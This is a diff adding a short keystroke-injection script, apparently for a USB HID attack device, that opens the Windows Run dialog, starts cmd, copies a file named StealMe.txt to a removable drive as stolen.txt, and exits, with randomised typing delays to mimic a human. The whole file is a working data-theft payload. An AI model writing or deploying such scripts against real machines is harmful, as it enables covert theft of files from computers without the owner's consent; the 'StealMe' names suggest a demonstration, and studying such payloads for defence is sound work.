@@ -1,0 +1,11 @@
+layout('us');			// US keyboard layout
+typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
+
+press("GUI r");
+delay(500);
+type("cmd\n")
+delay(1000);
+type("copy C:\\temp\\StealMe\\StealMe.txt E:\\stolen.txt");
+press("Enter");
+type("exit");
+press("Enter");
